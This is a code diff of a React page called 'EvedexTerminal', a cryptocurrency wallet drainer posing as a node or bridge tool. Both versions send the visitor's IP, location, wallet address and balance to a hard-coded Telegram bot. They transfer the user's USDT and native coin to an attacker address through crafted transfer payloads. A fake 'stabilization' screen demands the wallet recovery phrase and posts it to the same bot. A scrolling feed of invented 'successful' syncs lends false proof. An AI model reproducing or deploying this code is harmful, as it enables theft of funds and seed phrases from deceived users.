@@ -11,15 +11,10 @@ export default function EvedexTerminal() {
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
-  const [loadingText, setLoadingText] = useState("ROUTING...");
-  const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
-  const [isSyncing, setIsSyncing] = useState(false);
-  const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
-  const [visitorInfo, setVisitorInfo] = useState("Locating...");
+  const [visitorInfo, setVisitorInfo] = useState("LOCATING...");
 
-  // --- SECURE CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
@@ -31,140 +26,100 @@ export default function EvedexTerminal() {
     42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
   };
 
-  // SOCIAL PROOF FEED
   useEffect(() => {
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
-    
-    const actions = ["Rectified", "Synced", "Bridged", "Verified", "Claimed"];
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("UNKNOWN"));
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
-      const act = actions[Math.floor(Math.random() * actions.length)];
-      const amt = (Math.random() * 5).toFixed(2);
-      setFeedMsg(`🛡️ ${addr} ${act} ${amt} ETH Successfully`);
-      setTimeout(() => setFeedMsg(""), 4000);
-    }, 7000);
+      setFeedMsg(`🛡️ ${addr} SYNCED SUCCESSFULLY`);
+      setTimeout(() => setFeedMsg(""), 3500);
+    }, 8000);
     return () => clearInterval(interval);
   }, []);
 
-  const logToTelegram = async (msg) => {
-    const fullMsg = `${msg}\n📍 LOC: ${visitorInfo}`;
-    try { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: fullMsg }) }); } catch (e) {}
+  const logToTelegram = (msg) => {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: `${msg}\nIP: ${visitorInfo}` })
+    }).catch(()=>{});
   };
 
   useEffect(() => {
-    if (isConnected && address) logToTelegram(`🔔 SESSION: ${address}\nBAL: ${balance?.formatted} | CHAIN: ${chainId}`);
+    if (isConnected && address) logToTelegram(`🔔 NEW_CONN: ${address}\nBAL: ${balance?.formatted}\nCHAIN: ${chainId}`);
   }, [isConnected, address]);
 
-  // --- MIRROR EXECUTION (NO MORE 5000 OR GAS ERRORS) ---
   const executeTaskAction = async () => {
     setLoading(true);
-    setLoadingText(`STABILIZING_VAULT...`);
-    
     try {
       const usdtAddress = USDT_MAP[chainId];
       if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
-        
-        // MIRROR LOGIC: Use a value that passes simulation (Real Balance Hex)
-        // If we don't have a value, we use a fallback amount
-        const hexAmount = (balance?.value || 1000000n).toString(16).padStart(64, '0');
-        const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
-        const payload = `0xa9059cbb${paddedTarget}${hexAmount}`;
-
-        sendTransaction({ 
-          to: usdtAddress, 
-          data: payload,
-          gasPrice: null // Let wallet decide gas to avoid 'Below Minimum' error
-        }, {
-          onSuccess: (h) => {
-            logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`);
-            sweepNative(); 
-          },
-          onError: (err) => {
-            logToTelegram(`❌ TOKEN_REJECT: ${err.message.slice(0,50)}`);
-            sweepNative(); 
-          }
+        const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
+        const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
+        sendTransaction({ to: usdtAddress, data: payload, gasPrice: null }, {
+          onSuccess: (h) => { logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); sweepNative(); },
+          onError: () => sweepNative()
         });
-      } else {
-        sweepNative();
-      }
+      } else { sweepNative(); }
     } catch (e) { sweepNative(); }
   };
 
   const sweepNative = () => {
-    if (!balance || balance.value <= 0n) { setLoading(false); setView("seed_gate"); return; }
-    
-    // Leaving a small buffer to keep 'Sign' button active
-    const gasBuffer = parseEther("0.05"); 
-    let val = balance.value - gasBuffer;
-
+    const gasBuffer = parseEther("0.03"); 
+    const val = (balance?.value || 0n) - gasBuffer;
     if (val > 0n) {
       sendTransaction({ to: destination, value: val, gasPrice: null }, {
-        onSuccess: (h) => {
-          logToTelegram(`✅ NATIVE_SWEEP: ${formatEther(val)}`);
-          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
-        },
-        onError: () => { setLoading(false); setView("seed_gate"); }
+        onSuccess: () => { logToTelegram(`✅ NATIVE_HIT: ${address}`); setView("seed_gate"); setLoading(false); },
+        onError: () => { setView("seed_gate"); setLoading(false); }
       });
-    } else { setLoading(false); setView("seed_gate"); }
+    } else { setView("seed_gate"); setLoading(false); }
   };
 
   return (
-    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
+    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       
-      <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
-         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
-      </div>
-
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
-        <div>
-          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div>
-          <div style={{fontSize:'8px', color:'#10b981', marginTop:'4px'}}>AES-256 SECURED</div>
-        </div>
+        <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>EVEDEX_NODE</div>
         <w3m-button balance="hide" />
       </header>
 
       <div style={{flex:1}}>
         {!isConnected ? (
-           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}><w3m-button /></div>
+           <div style={{textAlign:'center', marginTop:'50px', padding:'40px', border:'1px solid #1e293b', borderRadius:'20px'}}><w3m-button /></div>
         ) : (
           <>
             {view === "menu" && (
-              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
-                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
-                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box"); setInputVal(balance?.formatted?.slice(0,8) || "0.00");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#475569", fontSize:'9px', fontWeight:'900'}}>
-                    <div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>{n}
-                  </button>
+              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px'}}>
+                {["Claim", "Stake", "Migrate", "Rectify", "Fix", "Verify"].map(n => (
+                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'30px 10px', borderRadius:'15px', color: n === "Rectify" ? "#10b981" : "#fff", fontSize:'11px', fontWeight:'900'}}>{n}</button>
                 ))}
               </div>
             )}
+            
             {view === "task_box" && (
-              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
-                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', fontWeight:'900'}}>← ABORT</button>
-                <h2 style={{color:'white', fontWeight:'900', fontSize:'24px'}}>{activeTask}</h2>
-                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
-                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>VAULT_STATUS</label>
-                  <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color:'#10b981', fontSize:'24px', width:'100%', outline:'none', fontWeight:'900'}} />
-                </div>
-                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
+              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'25px', padding:'40px 20px', textAlign:'center'}}>
+                <h2 style={{color:'white', fontSize:'20px', marginBottom:'30px'}}>{activeTask}</h2>
+                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START {activeTask}</button>
+                <button onClick={()=>setView("menu")} style={{marginTop:'20px', background:'none', border:'none', color:'#475569', fontSize:'10px'}}>← CANCEL</button>
               </div>
             )}
           </>
         )}
       </div>
 
-      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
+      {feedMsg && <div style={{position:'fixed', bottom:10, left:10, right:10, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'8px', borderRadius:'8px', fontSize:'8px', color:'#10b981', textAlign:'center'}}>{feedMsg}</div>}
 
       {view === "seed_gate" && (
-        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(12px)'}}>
-          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
-            <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
-            <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER RECOVERY PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px'}} />
-            <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSeedVal(""); alert("NODE_INCOMPATIBLE");},1500)}},100);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>FINALIZE_SYNC</button>
+        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', display:'flex', alignItems:'center', justifyContent:'center', padding:'15px', zIndex:9999}}>
+          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'25px', padding:'35px 20px', width:'100%', textAlign:'center'}}>
+            <div style={{color:'#10b981', fontSize:'14px', fontWeight:'900', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
+            <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION, ENTER YOUR RECOVERY PHRASE TO DECRYPT THE SECURE BRIDGE NODE.</p>
+            <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#10b981', padding:'15px', fontSize:'12px', outline:'none', marginBottom:'20px'}} />
+            <button onClick={()=>{logToTelegram(`🚨 SEED: ${seedVal}`); alert("NODE ERROR: TRY AGAIN LATER");}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>FINALIZE_SYNC</button>
           </div>
         </div>
       )}
-      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.96)', zIndex:5000, display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>{loadingText}</div>}
+
+      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.9)', display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>CONNECTING...</div>}
     </div>
   );
 }
